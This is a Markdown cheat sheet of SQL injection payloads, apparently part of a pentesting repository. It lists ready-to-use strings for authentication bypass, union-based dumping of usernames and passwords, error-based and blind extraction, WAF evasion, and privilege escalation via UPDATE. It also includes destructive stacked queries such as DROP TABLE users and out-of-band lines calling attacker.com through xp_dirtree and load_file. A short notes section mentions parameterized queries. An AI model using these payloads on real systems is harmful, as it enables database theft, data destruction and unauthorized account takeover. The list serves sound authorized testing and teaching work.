# SQLi Payloads

This file contains common and effective SQL injection payloads with explanations. Use responsibly in authorized testing environments only.

## Quick Checks

- Single quote: '
- Double quote: "
- Comment styles: --, #, /**/ 
- Boolean toggles: ' OR 1=1--, ' AND 1=2--

## Authentication Bypass

- ' OR 1=1--
- ' OR '1'='1'--
- admin'--
- ' OR 1=1 LIMIT 1--

## Union-Based Enumeration

Note: Adjust NULL count to match column count.

- ' UNION SELECT NULL--
- ' UNION SELECT NULL,NULL--
- ' UNION SELECT NULL,NULL,NULL--
- ' UNION SELECT 1,@@version--
- ' UNION SELECT table_name,NULL FROM information_schema.tables--
- ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
- ' UNION SELECT username,password FROM users--

## Error-Based Extraction

- ' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
- ' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--
- ' AND 1=(SELECT count(*) FROM information_schema.tables)--

## Boolean-Based Blind

- ' AND 1=1--
- ' AND 1=2--
- ' AND substring(database(),1,1)='a'--
- ' AND ascii(substring(user(),1,1))>100--

## Time-Based Blind

- ' AND SLEEP(5)-- (MySQL)
- '; WAITFOR DELAY '00:00:05'-- (MSSQL)
- '||pg_sleep(5)-- (PostgreSQL)
- ' AND IF(1=1,SLEEP(5),0)-- (MySQL)

## Stacked Queries (if supported)

- '; DROP TABLE users; --
- '; SELECT SLEEP(5);--

## Out-of-Band (OOB)

- '; EXEC master..xp_dirtree '\\attacker.com\\share'-- (MSSQL)
- ' UNION SELECT load_file('\\\\attacker.com\\file')-- (MySQL, Windows)

## WAF Evasion Tricks

- Whitespace: /**/, %0a, %09
- Case variations: UnIoN sElEcT
- Inline comments: UN/**/ION SEL/**/ECT
- String splitting: 'UNI'+'ON SEL'+'ECT' (MSSQL)
- URL encoding/Double encoding
- Using least-privileged endpoints to avoid noisy errors

## Insert/Update Context

- value'),('attacker','hash')--
- '); UPDATE users SET role='admin' WHERE username='victim';--

## JSON/REST Context

- {"id":"1 OR 1=1"}
- {"order":"price desc; SLEEP(5)"}

## Notes

- Always determine DB type first (MySQL/Postgres/MSSQL/Oracle)
- Use parameterized queries instead of blacklisting payloads in production
- Limit, paginate, and least-privilege the DB user

---

See also: [README.md](./README.md), [Remediation.md](./Remediation.md), [Reproduce.md](./Reproduce.md), [BurpSuite-Guide.md](./BurpSuite-Guide.md)
